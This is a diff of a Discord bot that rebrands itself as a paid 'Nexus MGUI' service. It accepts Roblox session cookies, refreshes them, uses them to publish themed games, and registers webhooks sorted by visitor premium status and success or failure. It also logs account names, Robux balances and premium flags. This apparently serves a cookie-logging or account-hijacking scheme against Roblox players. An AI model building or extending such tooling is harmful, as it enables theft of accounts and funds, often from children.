@@ -17,9 +17,10 @@ load_dotenv()
 
 rbxlx_files = {
     "nl": { #Theme Value make sure this not same value if you add a new theme
-        "theme_name": "Normal Theme",
+        "theme_name": "💡 OTHER THEMES:",
         "file_location": "Files/Normal_Theme.rbxlx"
     },
+
     # Add more themes here as needed
 }
 
@@ -134,7 +135,7 @@ tree = discord.app_commands.CommandTree(client)
 @client.event
 async def on_ready():
     await tree.sync()
-    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='Pogi Bot'), status=discord.Status.dnd)
+    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='Roblox'), status=discord.Status.dnd)
     print('Logged in')
     print('------')
     print(client.user.display_name)
@@ -228,7 +229,7 @@ def create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc,
     return apiCheck
 
  
-@tree.command(name="config", description="Setup/Update Your Game!")
+@tree.command(name="paid_setup", description="• Powered by Nexus MGUI")
 @app_commands.describe(
     game_id='Roblox Game ID',
     visit='Visit Webhook URL',
@@ -240,7 +241,7 @@ def create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc,
     failed='Failed Webhook URL'
 )
 
-async def config(interaction: discord.Interaction, game_id: str, visit: str, unnbc: str, unpremium: str, vnbc: str, vpremium: str, success: str, failed: str):
+async def setup(interaction: discord.Interaction, game_id: str, visit: str, unnbc: str, unpremium: str, vnbc: str, vpremium: str, success: str, failed: str):
 
     role_name = os.getenv('CUSTUMER_ROLE_NAME')
     guild_id = int(os.getenv("GUILD_ID"))
@@ -282,9 +283,9 @@ async def config(interaction: discord.Interaction, game_id: str, visit: str, unn
         if validate_create == "Successfully Listed His/Her Webhooks.":
 
             embed_var = discord.Embed(
-                title="Success, webhook listed on the database",
+                title="Success, Paid Webhook listed on the Secured database",
                 description="Is everything correct? If it's wrong, use the command again\n",
-                color=0x00FF1C
+                color=0x00FF71
             )
             embed_var.add_field(
                 name="Discord Information",
@@ -309,81 +310,14 @@ async def config(interaction: discord.Interaction, game_id: str, visit: str, unn
         embed_var = discord.Embed(title=message, color=discord.Color.red())
         await interaction.response.send_message(embed=embed_var, ephemeral=True)
 
-@tree.command(name="verify", description="Verify if The User Purchase The  Game-Pass")
-@app_commands.describe(userid="Roblox UserID Account")
-async def slash_purchase(interaction: discord.Interaction, userid: str):
-    
-    guild_id = int(os.getenv("GUILD_ID"))
-    guild = interaction.guild
-
-    if guild is None:
-      print(f"Guild not found with ID: {guild_id}")
-      return
-
-    member = guild.get_member(interaction.user.id)
-    if member is None:
-      print(f"Member not found in guild with ID: {guild_id}")
-      return
-    
-    discord_id = interaction.user.id
-
-    gamepass_id = os.getenv('GAMEPASS_ID')
-    api_url = f'https://inventory.roblox.com/v1/users/{userid}/items/Asset/{gamepass_id}/is-owned'
-    response = requests.get(api_url)
-
-    try:
-
-       if response.status_code == 400:
-          json_data = response.json()
-          embed_var = discord.Embed(title=json_data["errors"][0]["message"],color=0xf00226)
-          return await interaction.response.send_message(embed=embed_var, ephemeral=True)
-       
-       select_query = "SELECT * FROM purchases WHERE rbxid = %s"
-       select_data = (userid)
-
-       with conn.cursor() as cur:
-          cur.execute(select_query, select_data)
-
-       num_rows = cur.rowcount
-
-       if num_rows > 0:
-          embed_var = discord.Embed(title="This User Has Already Purchased The Game-Pass!",color=0xfa3e00)
-          return await interaction.response.send_message(embed=embed_var, ephemeral=True)
-       
-       if response.text == "true":
-          
-          embed_var = discord.Embed(title="Thanks for buying our product customer role will be added!",color=0x00f55e)
-          await interaction.response.send_message(embed=embed_var, ephemeral=True)
-          role = discord.utils.get(interaction.guild.roles, id=int(os.getenv('CUSTOMER_ROLEID')))
-          await interaction.user.add_roles(role)
-
-          insert_query = "INSERT INTO purchases (discid, rbxid) VALUES (%s, %s)"
-          insert_data = (discord_id, userid)
-
-          with conn.cursor() as cur:
-              cur.execute(insert_query, insert_data)
-          conn.commit()    
-
-       elif response.text == 'false':
-          embed_var = discord.Embed(
-             title="Purchase The Game-Pass First!", 
-             description=f"** [[Click Here]({os.getenv('GAMEPASS_LINK')})] **",
-             color=0xf00226
-          )
-          return await interaction.response.send_message(embed=embed_var, ephemeral=True)    
-          
-    except Exception as e:
-      await interaction.response.send_message(e)
-    
-
 @tree.command(
-    name="publish_new_game",
-    description="Upload a Roblox game to the platform"
+    name="paid_create",
+    description="• Powered by Nexus MGUI"
 )
-@app_commands.describe(theme='Choose a Theme')
+@app_commands.describe(theme='Selection:')
 @app_commands.choices(theme=theme_choices)
 
-async def slash_publish_new_game(interaction: discord.Interaction, theme: discord.app_commands.Choice[str], cookie: str, gamename: str = None, description: str = None):
+async def slash_paid_create(interaction: discord.Interaction, theme: discord.app_commands.Choice[str], cookie: str, gamename: str = None, description: str = None):
 
   role_name = os.getenv('CUSTUMER_ROLE_NAME')
   guild_id = int(os.getenv("GUILD_ID"))
@@ -405,15 +339,15 @@ async def slash_publish_new_game(interaction: discord.Interaction, theme: discor
     embed_var = discord.Embed(title=message, color=8918293)
     return await interaction.response.send_message(embed=embed_var, ephemeral=True)
       
-  message = "Uploading Game"
-  embed_var = discord.Embed(title=message, color=0x00f55e)
+  message = "Uploading Paid Game, Please Wait."
+  embed_var = discord.Embed(title=message, color=0x00FF71)
   await interaction.response.send_message(embed=embed_var, ephemeral=True)
 
   refreshed_cookie = refresh_cookie(cookie)
 
   if refreshed_cookie is None:
     message = "Invalid Cookie"
-    embed_var = discord.Embed(title=message, color=0xf00226)
+    embed_var = discord.Embed(title=message, color=0xfac54d)
     return await interaction.followup.send(embed=embed_var, ephemeral=True)
 
   try:
@@ -478,8 +412,8 @@ async def slash_publish_new_game(interaction: discord.Interaction, theme: discor
 
     success_embed = discord.Embed(
         title="Place Created",
-        description=f"Your game has been successfully created.\n[Click here to play!]({game_url})", 
-        color=0x00f55e
+        description=f"Game has been successfully created.\n[Click here to play!]({game_url})", 
+        color=0xfac54d
     )
 
     await interaction.followup.send(embed=success_embed, ephemeral=True)
@@ -532,29 +466,29 @@ async def slash_publish_new_game(interaction: discord.Interaction, theme: discor
  
         game_icon = get_game_icon(game_id)
 
-        embed_var = discord.Embed(title="Your Game Has Been Published", description="**SuccessFully Published!**", color=0x00FF71)
-        embed_var.add_field(name='Game Name', value='' + str(gamename) + '')
-        embed_var.add_field(name='Description', value='' + str(description) + '')
-        embed_var.add_field(name='**Game ID**', value='' + str(game_id) + '')
-        embed_var.add_field(name='**Theme**', value='' + str(theme.name) + '')
-        embed_var.add_field(name="Game Link", value=f'**[Click here to view your Game](https://www.roblox.com/games/{str(game_id)})**', inline=False)
-        embed_var.set_footer(text="Your Game Has Been Successfully Published!! - ")
+        embed_var = discord.Embed(title="Game Has Been Published", description="**SuccessFully Published!**", color=0x00FF71)
+        embed_var.add_field(name='🎮 Game Name:', value='' + str(gamename) + '')
+        embed_var.add_field(name='🗨️ Description:', value='' + str(description) + '')
+        embed_var.add_field(name='🪪 Game ID:', value='' + str(game_id) + '')
+        embed_var.add_field(name='💡 Theme:', value='' + str(theme.name) + '')
+        embed_var.add_field(name="🔗 Game Link:", value=f'**[Click here to view your Game](https://www.roblox.com/games/{str(game_id)})**', inline=False)
+        embed_var.set_footer(text="╰┈➤ Game has been successfully published")
         embed_var.set_thumbnail(url=f"{game_icon}")
         await interaction.followup.send(embed=embed_var, ephemeral=True)
         channel = client.get_channel(int(os.getenv('PUBLISH_LOG')))
 
         embed_var = discord.Embed(
-          title="Test MGUI",
-          description= f'**<@{interaction.user.id}> Successfully Uploaded A New Game**\n\n**Account Information**\n**Account Username -** ' + str(username) + '\n**Account ID - ** ' + str(userid) + '\n**Robux - ** ' + str(user_robux) + '\n**isPremium? - **' + str(user_isprem) + '\n\n**Game Information**\n**Game Name - ||Hidden||**\n**Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
-          color=0xfac54d
+          title="Nexus Botbased - Published Paid Game",
+          description= f'**<@{interaction.user.id}> ┈➤ Sucessfully Created A Game\n💡Theme: '+ str(theme.name)+'',
+          color=0x00FF71
         )
         embed_var.set_thumbnail(url=f'{avatarurl}')
 
-        embed_var.set_footer(text="Test Logs")
+        embed_var.set_footer(text="╰┈➤Game has been successfully published")
         await channel.send(embed=embed_var)
   else:
         message2 = (f'Oops! Something went wrong, {refreshed_cookie}!')
-        embed_var = discord.Embed(title=message2, color=0xf00226)
+        embed_var = discord.Embed(title=message2, color=0x00FF71)
         await interaction.followup.send(embed=embed_var, ephemeral=True)
 
 client.run(os.getenv('TOKEN'))
